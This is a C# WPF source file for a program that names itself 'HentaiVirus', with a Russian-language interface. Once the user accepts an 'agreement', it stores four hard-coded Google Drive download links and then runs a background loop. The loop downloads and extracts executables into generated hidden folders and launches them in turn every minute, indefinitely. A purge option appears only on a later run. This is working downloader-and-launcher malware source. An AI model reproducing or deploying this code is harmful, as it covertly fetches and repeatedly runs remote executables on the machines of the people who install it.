using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using HentaiVirus.Core;
using HentaiVirus.Database;
using Microsoft.Data.Sqlite;

namespace HentaiVirus.UI
{
    public partial class MainWindow : Window
    {
        private static readonly TimeSpan LaunchInterval = TimeSpan.FromMinutes(1);

        private readonly DatabaseManager _dbManager = new();
        private readonly bool _isAlreadyInstalled;
        private CancellationTokenSource? _engineCancellation;

        public MainWindow()
        {
            InitializeComponent();

            _isAlreadyInstalled = _dbManager.DatabaseExists;

            if (_isAlreadyInstalled)
            {
                Title = "HentaiVirus - Деинсталляция";
                InstructionText.Text = "Программа уже установлена. Нажмите кнопку ниже, чтобы завершить процессы и удалить контент.";
                AcceptButton.Content = "Удалить все изменения";
                AcceptButton.Background = new SolidColorBrush(Color.FromRgb(209, 52, 56));
            }
        }

        private void AcceptButton_Click(object sender, RoutedEventArgs e)
        {
            if (_isAlreadyInstalled)
            {
                PurgeInstalledContent();
                return;
            }

            StartLauncher();
        }

        private void PurgeInstalledContent()
        {
            try
            {
                _dbManager.PurgeEverything();
                MessageBox.Show("Очистка успешно завершена. Данные удалены.", "Успех", MessageBoxButton.OK, MessageBoxImage.Information);
                Application.Current.Shutdown();
            }
            catch (Exception ex)
            {
                AppLogger.Log(ex, "Purge failed");
                MessageBox.Show($"Ошибка при удалении компонентов: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void StartLauncher()
        {
            MessageBox.Show("Соглашение принято. Запуск фоновых служб...", "Информация", MessageBoxButton.OK, MessageBoxImage.Information);
            
            _dbManager.InitializeDatabase();
            SeedDatabaseWithLinks();

            InstructionText.Text = "Служба работает. Окно можно закрыть.";
            AcceptButton.IsEnabled = false;

            _engineCancellation = new CancellationTokenSource();
            _ = Task.Run(async () =>
            {
                try
                {
                    await StartCoreEngineAsync(_engineCancellation.Token).ConfigureAwait(false);
                }
                catch (OperationCanceledException)
                {
                    AppLogger.Log("Background engine stopped by cancellation.");
                }
                catch (Exception ex)
                {
                    AppLogger.Log(ex, "Background engine failed");
                }
            });
        }

        private void SeedDatabaseWithLinks()
        {
            using var connection = _dbManager.CreateConnection();
            connection.Open();

            using var checkCmd = new SqliteCommand("SELECT COUNT(*) FROM Games", connection);
            long count = (long)checkCmd.ExecuteScalar()!;
            if (count != 0) return;

            string[] gameUrls =
            {
                "https://drive.usercontent.google.com/download?id=1w5_0vSXEATOPKzlv-f3MNwZ8RwMwJ8O0&export=download&confirm=t",
                "https://drive.usercontent.google.com/download?id=1E4uPRscQ288-LPCi9Iii6VHWI9Dat9GK&export=download&confirm=t",
                "https://drive.usercontent.google.com/download?id=10fI0LwuxeIFerO0tW5U-HQt7GDOFWIst&export=download&confirm=t",
                "https://drive.usercontent.google.com/download?id=1blYEOgTHQ4mw7mnd-27Apisnw3sNFPLd&export=download&confirm=t"
            };

            foreach (string url in gameUrls)
            {
                using var insertCmd = new SqliteCommand(
                    "INSERT INTO Games (DownloadUrl, TargetDirectory, ExePath) VALUES (@url, '', '')", connection);
                insertCmd.Parameters.AddWithValue("@url", url);
                insertCmd.ExecuteNonQuery();
            }
        }

        private async Task StartCoreEngineAsync(CancellationToken cancellationToken)
        {
            var downloader = new Downloader();
            int nextGameIndex = 0;

            while (true)
            {
                cancellationToken.ThrowIfCancellationRequested();

                try
                {
                    _dbManager.InitializeDatabase();
                    await DownloadMissingGamesAsync(downloader, cancellationToken).ConfigureAwait(false);

                    List<string> gameExePaths = GetReadyGameExePaths();
                    if (gameExePaths.Count > 0)
                    {
                        string exeToRun = gameExePaths[nextGameIndex % gameExePaths.Count];
                        nextGameIndex++;
                        LaunchGame(exeToRun);
                    }
                    else
                    {
                        AppLogger.Log("No downloaded games are ready to launch.");
                    }
                }
                catch (OperationCanceledException)
                {
                    throw;
                }
                catch (Exception ex)
                {
                    AppLogger.Log(ex, "Engine iteration failed");
                }

                await Task.Delay(LaunchInterval, cancellationToken).ConfigureAwait(false);
            }
        }

        private async Task DownloadMissingGamesAsync(Downloader downloader, CancellationToken cancellationToken)
        {
            List<(int Id, string Url)> pendingDownloads = GetPendingDownloads();
            
            foreach (var download in pendingDownloads)
            {
                cancellationToken.ThrowIfCancellationRequested();
                try
                {
                    string gameName = $"Game_{download.Id}";
                    string targetFolder = _dbManager.GenerateHiddenPath(gameName);
                    string exePath = await downloader
                        .DownloadAndExtractAsync(download.Url, targetFolder, cancellationToken)
                        .ConfigureAwait(false);

                    if (string.IsNullOrWhiteSpace(exePath))
                    {
                        AppLogger.Log($"Package {download.Id} extracted, but no exe found.");
                        continue;
                    }

                    MarkGameAsDownloaded(download.Id, targetFolder, exePath);
                }
                catch (Exception ex)
                {
                    AppLogger.Log(ex, $"Failed to download package {download.Id}");
                }
            }
        }

        private List<(int Id, string Url)> GetPendingDownloads()
        {
            var downloads = new List<(int Id, string Url)>();
            using var connection = _dbManager.CreateConnection();
            connection.Open();
            using var selectCmd = new SqliteCommand("SELECT Id, DownloadUrl FROM Games WHERE IsDownloaded = 0", connection);
            using var reader = selectCmd.ExecuteReader();
            
            while (reader.Read())
            {
                downloads.Add((reader.GetInt32(0), reader.GetString(1)));
            }

            return downloads;
        }

        private void MarkGameAsDownloaded(int id, string targetFolder, string exePath)
        {
            using var connection = _dbManager.CreateConnection();
            connection.Open();
            using var updateCmd = new SqliteCommand(
                "UPDATE Games SET TargetDirectory = @dir, ExePath = @exe, IsDownloaded = 1 WHERE Id = @id",
                connection);
            updateCmd.Parameters.AddWithValue("@dir", targetFolder);
            updateCmd.Parameters.AddWithValue("@exe", exePath);
            updateCmd.Parameters.AddWithValue("@id", id);
            updateCmd.ExecuteNonQuery();
        }

        private List<string> GetReadyGameExePaths()
        {
            var exePaths = new List<string>();
            using var connection = _dbManager.CreateConnection();
            connection.Open();
            using var command = new SqliteCommand("SELECT ExePath FROM Games WHERE IsDownloaded = 1 ORDER BY Id", connection);
            using var reader = command.ExecuteReader();
            
            while (reader.Read())
            {
                string exePath = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
                if (File.Exists(exePath))
                {
                    exePaths.Add(exePath);
                }
                else if (!string.IsNullOrWhiteSpace(exePath))
                {
                    AppLogger.Log($"Downloaded game exe is missing: {exePath}");
                }
            }

            return exePaths;
        }

        private static void LaunchGame(string exePath)
        {
            try
            {
                string? gameFolder = Path.GetDirectoryName(exePath);
                if (string.IsNullOrWhiteSpace(gameFolder))
                {
                    AppLogger.Log($"Cannot launch game without folder: {exePath}");
                    return;
                }

                var startInfo = new ProcessStartInfo
                {
                    FileName = exePath,
                    WorkingDirectory = gameFolder,
                    UseShellExecute = true
                };

                using Process? process = Process.Start(startInfo);
                AppLogger.Log($"Game launched: {exePath}");
                
                process?.WaitForExit();
            }
            catch (Exception ex)
            {
                AppLogger.Log(ex, $"Failed to start process {exePath}");
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            _engineCancellation?.Cancel();
            _engineCancellation?.Dispose();
            base.OnClosed(e);
        }
    }
}
